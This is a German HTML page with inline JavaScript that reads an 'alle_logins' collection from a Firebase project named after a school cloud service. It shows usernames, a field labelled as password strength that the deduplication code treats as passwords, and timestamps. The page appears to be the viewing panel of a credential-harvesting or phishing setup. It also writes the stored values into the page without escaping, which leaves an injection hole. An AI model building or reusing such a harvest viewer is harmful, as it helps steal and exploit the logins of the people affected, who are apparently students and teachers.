<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gespeicherte Logins</title>
</head>
<body>

<h1>Gespeicherte Logins</h1>
<p>Gespeicherte Einträge: <strong id="rowCount">0</strong></p>

<table id="loginsTable" border="1">
    <thead>
        <tr>
            <th>Nutzername</th>
            <th>Passwortstärke</th>
            <th>Timestamp</th>
        </tr>
    </thead>
    <tbody>
        <!-- Hier werden die Daten eingefügt -->
    </tbody>
</table>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAxJCE8AELVQGZub1e-vBzcWxdn_2bveGw",
  authDomain: "dbildungscloud.firebaseapp.com",
  projectId: "dbildungscloud",
  storageBucket: "dbildungscloud.firebasestorage.app",
  messagingSenderId: "435869869232",
  appId: "1:435869869232:web:dcf44e91e625f5d786c775",
  databaseURL: "https://dbildungscloud-default-rtdb.europe-west1.firebasedatabase.app"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const tableBody = document.querySelector("#loginsTable tbody");
const loginsRef = ref(db, "alle_logins");

const rowCountEl = document.getElementById("rowCount");

onValue(loginsRef, (snapshot) => {
    tableBody.innerHTML = "";
    let rowCount = 0;

    const data = snapshot.val();
    if (!data) {
        rowCountEl.textContent = "0";
        return;
    }

    // email -> Set(passwortStaerke)
    const seenPasswordsByEmail = new Map();

    Object.values(data).forEach(entry => {
        const email = entry.name;
        const pass = entry.passwortStaerke;

        if (!seenPasswordsByEmail.has(email)) {
            seenPasswordsByEmail.set(email, new Set());
        }

        const seenPasswords = seenPasswordsByEmail.get(email);

        // bereits bekannt → überspringen
        if (seenPasswords.has(pass)) return;

        seenPasswords.add(pass);

        const row = document.createElement("tr");
        row.innerHTML = `
            <td>${email}</td>
            <td>${pass}</td>
            <td>${entry.timestamp}</td>
        `;
        tableBody.appendChild(row);

        rowCount++; // ✅ nur echte neue Zeilen zählen
    });

    rowCountEl.textContent = rowCount;
});


</script>

</body>
</html>
